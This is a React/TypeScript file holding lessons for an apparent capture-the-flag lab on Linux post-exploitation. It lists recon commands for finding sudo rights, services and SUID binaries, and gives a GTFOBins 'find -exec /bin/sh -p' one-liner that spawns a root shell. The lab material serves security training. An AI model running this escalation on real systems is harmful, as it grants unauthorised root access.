import RoomLab, { Bullets, InlineCode, PayloadBlock } from "./RoomLab";
import type { RoomBodyProps, RoomLessonMap } from "./types";

const RED_4_LESSONS: RoomLessonMap = {
  "ch-1": {
    objective:
      "Once you have a foothold, enumerate the system to plan your next move.",
    background: (
      <p>
        Post-exploitation enumeration is a calm, deliberate sweep: who am I,
        what runs on this box, where can I write, and what other hosts can I
        reach? Quick and quiet beats noisy and clever.
      </p>
    ),
    steps: [
      {
        title: "Identity & sudo",
        body: (
          <PayloadBlock>{`id\nwhoami\nsudo -l 2>/dev/null`}</PayloadBlock>
        ),
      },
      {
        title: "Processes, services, listeners",
        body: (
          <PayloadBlock>{`ps -ef\nss -tulpn\nsystemctl list-units --type=service`}</PayloadBlock>
        ),
      },
      {
        title: "Filesystem and writable paths",
        body: (
          <PayloadBlock>{`find / -writable -type d 2>/dev/null | head\nfind / -perm -u+s -type f 2>/dev/null`}</PayloadBlock>
        ),
      },
      {
        title: "Capture the flag",
        body: (
          <p>
            Submit <InlineCode>{`NEXUS{POSTEX_ENUM_<TEAM_ID>}`}</InlineCode> once
            you've documented the recon.
          </p>
        ),
      },
    ],
    verification: [
      "Captured user identity and sudo entitlements",
      "Listed running services and exposed ports",
      "Recorded SUID binaries and writable directories",
    ],
  },
  "ch-2": {
    objective:
      "Use a known SUID misconfiguration to escalate from a low-priv user to root.",
    background: (
      <p>
        SUID-root binaries run with elevated privileges. If one of them is on
        the GTFOBins list (e.g. <InlineCode>find</InlineCode>,{" "}
        <InlineCode>vim</InlineCode>, <InlineCode>cp</InlineCode>) you have a
        ready-made escalation primitive.
      </p>
    ),
    steps: [
      {
        title: "Find a candidate",
        body: (
          <Bullets
            items={[
              <>Cross-reference your SUID list against <a href="https://gtfobins.github.io/" target="_blank" rel="noreferrer" className="underline">GTFOBins</a>.</>,
              <>Pick the cheapest hit (often <InlineCode>find</InlineCode> or <InlineCode>vim</InlineCode>).</>,
            ]}
          />
        ),
      },
      {
        title: "Trigger the escalation",
        body: (
          <PayloadBlock>{`/usr/bin/find . -exec /bin/sh -p \\; -quit`}</PayloadBlock>
        ),
      },
      {
        title: "Capture the flag",
        body: (
          <p>
            Confirm with <InlineCode>id</InlineCode> that you are uid 0 and
            submit{" "}
            <InlineCode>{`NEXUS{POSTEX_PRIVESC_<TEAM_ID>}`}</InlineCode>.
          </p>
        ),
      },
    ],
    verification: [
      "Identified the vulnerable SUID binary",
      "Spawned a root shell",
      "Documented a remediation (drop the SUID bit / wrapper script)",
    ],
  },
};

export default function Red4Body(props: RoomBodyProps) {
  return <RoomLab {...props} lessons={RED_4_LESSONS} />;
}
